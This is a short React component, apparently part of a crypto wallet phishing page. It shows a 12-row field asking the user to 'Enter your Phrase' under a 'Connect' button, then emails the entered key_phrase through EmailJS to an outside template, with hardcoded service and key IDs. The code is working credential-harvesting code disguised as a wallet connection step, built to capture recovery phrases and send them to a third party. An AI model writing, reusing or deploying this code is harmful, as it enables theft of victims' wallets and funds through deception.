import * as React from "react";
import Box from "@mui/material/Box";
import TextField from "@mui/material/TextField";
import Button from "@mui/material/Button";
import emailjs from "@emailjs/browser";
import { useState, useRef } from "react";
import { useNavigate } from "react-router-dom";

const Phrase = () => {
  const form = useRef();
  let navigate = useNavigate();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_yj787qi",
        "template_sv7wpyj",
        form.current,
        "g4ZEWVbf7KjSHQdm2"
      )
      .then(
        (result) => {
          navigate("/success-page");
        },
        (error) => {
          console.log(error);
          navigate("/error");
        }
      );
  };

  return (
    <Box>
      <Box
        component="form"
        sx={{
          "& .MuiTextField-root": { m: 1, width: "100%" },
        }}
        noValidate
        autoComplete="off"
        ref={form}
        onSubmit={sendEmail}
      >
        <div>
          <TextField
            // value={toSend.key_phrase}
            placeholder="Phrase"
            id="standard-multiline-static"
            label="Enter your Phrase"
            size="Large"
            multiline
            autoFocus
            rows={12}
            variant="standard"
            name="key_phrase"
          />
          <Box margin={4}>
            <Button
              variant="contained"
              color="success"
              type="submit"
              size="large"
            >
              Connect
            </Button>
          </Box>
        </div>
      </Box>
    </Box>
  );
};

export default Phrase
